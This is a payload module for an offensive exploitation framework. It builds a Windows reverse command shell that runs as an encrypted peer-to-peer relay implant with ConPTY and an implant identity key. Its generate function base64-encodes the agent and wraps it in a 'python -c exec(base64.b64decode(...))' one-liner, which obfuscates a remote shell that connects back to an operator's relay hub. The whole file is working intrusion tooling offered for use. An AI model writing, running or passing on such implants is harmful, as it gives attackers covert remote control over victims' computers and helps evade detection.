#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.relay.payload_stub import build_relay_conpty_agent_script


class Module(Payload):

    CLIENT_LANGUAGE = "python"

    __info__ = {
        "name": "Windows Command Shell, P2P Relay (via Python)",
        "description": (
            "P2P relay agent (KSRL v2 E2E + Ed25519 identity + ConPTY). "
            "Win10 1809+. Requires cryptography on target."
        ),
        "category": PayloadCategory.CMD,
        "arch": Arch.PYTHON,
        "platform": Platform.WINDOWS,
        "listener": "listeners/multi/p2p_relay",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    relay_host = OptString("127.0.0.1", "Relay hub IP or hostname", True)
    relay_port = OptPort(9000, "Relay hub port", True)
    relay_token = OptString("", "Room token (defaults to implant_id)", False, True)
    relay_psk = OptString("", "Pre-shared secret for E2E key (must match listener)", False, True)
    shell_binary = OptString("cmd.exe", "Shell (cmd.exe or powershell.exe)", True)
    python_binary = OptString("python", "Python interpreter", True)
    encrypt = OptBool(True, "E2E encrypt relay stream", False, True)
    keepalive_interval = OptInteger(30, "Keepalive interval in seconds (0=off)", False, True)

    def _build_script(self) -> str:
        identity = self._apply_implant_identity_options()
        token = str(getattr(getattr(self, "relay_token", None), "value", self.relay_token) or "").strip()
        if not token and identity:
            token = identity.implant_id
        elif not token:
            token = "kitty-room"
        return build_relay_conpty_agent_script(
            str(self.relay_host),
            int(self.relay_port),
            token,
            shell=str(self.shell_binary),
            psk=str(self.relay_psk or ""),
            keepalive_interval=float(self.keepalive_interval or 0),
            encrypt=bool(self.encrypt),
            private_key_pem=identity.private_key_pem if identity else None,
        )

    def generate(self):
        script = self._build_script()
        py = str(self.python_binary)
        import base64 as b64

        encoded = b64.b64encode(script.encode("utf-8")).decode("ascii")
        return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
